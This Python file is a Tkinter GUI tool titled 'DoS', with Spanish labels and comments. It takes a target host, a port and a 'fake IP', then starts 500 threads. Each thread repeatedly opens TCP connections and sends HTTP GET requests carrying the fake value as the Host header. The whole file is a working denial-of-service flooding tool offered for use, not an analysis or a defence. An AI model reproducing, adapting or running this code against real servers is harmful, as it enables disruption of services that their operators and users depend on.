import tkinter as tk
import tkinter.font as tkFont
from tkinter import ttk
from tkinter import messagebox as tkMessageBox
import socket
import sys
import threading
class App:
    def __init__(self, root):
        #setting title
        root.title("DoS")
        #setting window size
        width=600
        height=700
        screenwidth = root.winfo_screenwidth()
        screenheight = root.winfo_screenheight()
        alignstr = '%dx%d+%d+%d' % (width, height, (screenwidth - width) / 2, (screenheight - height) / 2)
        root.geometry(alignstr)
        root.resizable(width=False, height=False)
        canvas = tk.Canvas(root)
        scrollbar = ttk.Scrollbar(root, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(
                scrollregion=canvas.bbox("all")
            )
        )
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        
        canvas.configure(yscrollcommand=scrollbar.set,bg="black")
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        GLabel_950=tk.Label(root)
        ft = tkFont.Font(family='Times New Roman',size=20)
        GLabel_950["font"] = ft
        GLabel_950["fg"] = "white"
        GLabel_950["bg"] = "black"
        GLabel_950["justify"] = "center"
        GLabel_950["text"] = "DoS"
        GLabel_950.place(x=170,y=20,width=211,height=35)

        self.targetip = tk.StringVar()
        GLineEdit_132=tk.Entry(root)
        GLineEdit_132["borderwidth"] = "1px"
        ft = tkFont.Font(family='Times',size=10)
        GLineEdit_132["font"] = ft
        GLineEdit_132["fg"] = "black"
        GLineEdit_132["bg"] = "white"
        GLineEdit_132["justify"] = "center"
        GLineEdit_132["textvariable"] = self.targetip
        GLineEdit_132.place(x=330,y=80,width=128,height=30)

        GLabel_981=tk.Label(root)
        ft = tkFont.Font(family='Times',size=10)
        GLabel_981["font"] = ft
        GLabel_981["fg"] = "white"
        GLabel_981["bg"] = "black"
        GLabel_981["justify"] = "center"
        GLabel_981["text"] = "Introduzca el nombre del host o la direccion IP:"
        GLabel_981.place(x=10,y=80,width=346,height=33)

        GLabel_622=tk.Label(root)
        ft = tkFont.Font(family='Times',size=10)
        GLabel_622["font"] = ft
        GLabel_622["fg"] = "white"
        GLabel_622["bg"] = "black"
        GLabel_622["justify"] = "left"
        GLabel_622["text"] = "Introduzca la ip falsa que desea usar:"
        GLabel_622.place(x=10,y=120,width=300,height=30)

        self.fakeip=tk.StringVar()
        GLineEdit_334=tk.Entry(root)
        GLineEdit_334["borderwidth"] = "1px"
        ft = tkFont.Font(family='Times',size=10)
        GLineEdit_334["font"] = ft
        GLineEdit_334["fg"] = "black"
        GLineEdit_334["bg"] = "white"
        GLineEdit_334["justify"] = "center"
        GLineEdit_334["textvariable"] = self.fakeip
        GLineEdit_334.place(x=320,y=120,width=128,height=30)

        GLabel_470=tk.Label(root)
        ft = tkFont.Font(family='Times',size=10)
        GLabel_470["font"] = ft
        GLabel_470["fg"] = "white"
        GLabel_470["bg"] = "black"
        GLabel_470["justify"] = "center"
        GLabel_470["text"] = "Introducir Puerto:"
        GLabel_470.place(x=10,y=160,width=201,height=30)

        self.puerto=tk.IntVar()
        GLineEdit_430=tk.Entry(root)
        GLineEdit_430["borderwidth"] = "1px"
        ft = tkFont.Font(family='Times',size=10)
        GLineEdit_430["font"] = ft
        GLineEdit_430["fg"] = "black"
        GLineEdit_430["bg"] = "white"
        GLineEdit_430["justify"] = "center"
        GLineEdit_430["textvariable"] = self.puerto
        GLineEdit_430.place(x=220,y=160,width=87,height=30)
        

        GButton_797=tk.Button(root)
        GButton_797["bg"] = "white"
        ft = tkFont.Font(family='Times',size=10)
        GButton_797["font"] = ft
        GButton_797["fg"] = "#000000"
        GButton_797["justify"] = "center"
        GButton_797["text"] = "Empezar"
        GButton_797.place(x=230,y=220,width=122,height=30)
        GButton_797["command"] = self.GButton_797_command
        self.cont=260


    def GButton_797_command(self):
        # Aqui declaramos las variables que recibiran los valores que se introduciran en los inputs de la ventana
        fake_ip = self.fakeip.get()
        host = self.targetip.get()
        port = self.puerto.get()
        #Mediante socket estableceremos conexion mediante el puerto especificado a el servidor web que hemos especificado
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        estado=sock.connect_ex((host,port))
        #Si se consigue conectar al objetivo, es decir se establece la conexion
        if estado==0:
            #En esta parte de label se mostraran dichos mensajes en la ventana       
            label = tk.Label(root,text="Conexion probada=OK",fg="blue",bg="black",justify="center")
            label.place(x=30,y=self.cont,width=530,height=20)
            self.cont=self.cont+20
            label = tk.Label(root,text="Esta accion puede tardar...",fg="green",bg="black",justify="center")               
            label.place(x=30,y=self.cont,width=530,height=20)
            self.cont=self.cont+20
            #En el siguiente bucle for mediante la libreria threading optimizamos la ejecucion de la funcion attack
            for i in range(500):
                thread = threading.Thread(target=self.attack)
                thread.start()
        #Si no se establece una conexion con el objetivo en la ventana aparecera un mensaje de error
        else:
            self.cont=self.cont+20
            label = tk.Label(root,text= "Error - No se pudo conectar al host.",fg="red",bg="black",justify="center")
            label.place(x=30,y=self.cont,width=530,height=20)
        
        
    def attack(self):
        # Aqui declaramos las variables que recibiran los valores que se introduciran en los inputs de la ventana
            fake_ip = self.fakeip.get()
            host = self.targetip.get()
            port = self.puerto.get()
            #En este bucle se envian los paquetes al objetivo con la finalidad de hacer el DoS
            while True:
                try:
                    #Mediante socket estableceremos conexion mediante el puerto especificado a el servidor web que hemos especificado
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((host, port))
                    #Aqui se envia paquetes al objetivo
                    s.sendto(("GET /" + host + " HTTP/1.1\r\n").encode('ascii'), (host, port))
                    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (host, port))
                    #Se printea en la terminal para poder realizar un seguimiento
                    print(("GET /" + host + " HTTP/1.1\r\n").encode('ascii'), (host, port))
                    print(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (host, port))            
                    #Se cierra la conexion        
                    s.close()
                #Excepcion para que se salga de la aplicacion si se presiona Ctrl+C
                except KeyboardInterrupt:
                    print("Se presiono Ctrl+C")
                    sys.exit()
if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.mainloop()
